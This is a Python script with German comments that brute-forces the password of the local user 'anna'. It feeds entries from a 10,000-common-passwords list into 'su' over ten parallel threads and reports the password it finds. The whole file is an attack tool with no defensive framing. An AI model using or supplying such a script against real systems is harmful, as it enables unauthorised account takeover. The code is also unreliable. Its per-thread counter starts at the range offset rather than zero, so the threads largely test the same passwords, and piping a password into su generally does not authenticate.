import subprocess
import concurrent.futures

# Funktion, die versucht, sich mit einer bestimmten Liste von Passwörtern anzumelden
def try_passwords(start_range, end_range):
    # Benutzername, für den das Passwort getestet werden soll
    username = "anna"

    # Pfad zur Datei mit den 10.000 häufigsten Passwörtern
    password_list_path = "./10k-most-common.txt"

    # Initialisieren des Zählers
    counter = start_range

    # Versuchen Sie jedes Passwort aus dem zugewiesenen Bereich
    with open(password_list_path, "r") as file:
        for line in file:
            # Strip newline characters und führende/trailing Leerzeichen entfernen
            password = line.strip()
            
            # Überspringen Sie Passwörter außerhalb des zugewiesenen Bereichs
            if counter < start_range or counter >= end_range:
                counter += 1
                continue
            
            # Versuchen Sie, sich mit dem aktuellen Passwort anzumelden
            command = f"echo '{password}' | su {username} 2>&1"
            result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            # Drucken des Zählers und des Fortschritts
            print(f"Versuch {counter}")
            
            # Überprüfen Sie, ob die Anmeldung erfolgreich war
            if result.returncode == 0:
                print(f"Erfolgreich angemeldet als '{username}' mit dem Passwort '{password}'")
                return password  # Beenden Sie die Funktion und geben Sie das gefundene Passwort zurück
            else:
                print(f"Fehler beim Anmelden als '{username}' mit dem Passwort '{password}': {result.stderr.decode()}")
            
            # Erhöhen des Zählers
            counter += 1

# Liste der Bereiche für jeden Prozess
ranges = [(0, 1000), (1000, 2000), (2000, 3000), (3000, 4000), (4000, 5000),
          (5000, 6000), (6000, 7000), (7000, 8000), (8000, 9000), (9000, 10000)]

# Starten Sie die Prozesse in einer ThreadPoolExecutor
with concurrent.futures.ThreadPoolExecutor() as executor:
    # Starten Sie jede Session in einem separaten Thread
    futures = [executor.submit(try_passwords, start, end) for start, end in ranges]

    # Warten Sie auf das Ergebnis jeder Session
    for future in concurrent.futures.as_completed(futures):
        result = future.result()
        if result:
            print(f"Passwort gefunden: {result}")
            break  # Beenden Sie die Schleife, wenn ein Passwort gefunden wurde
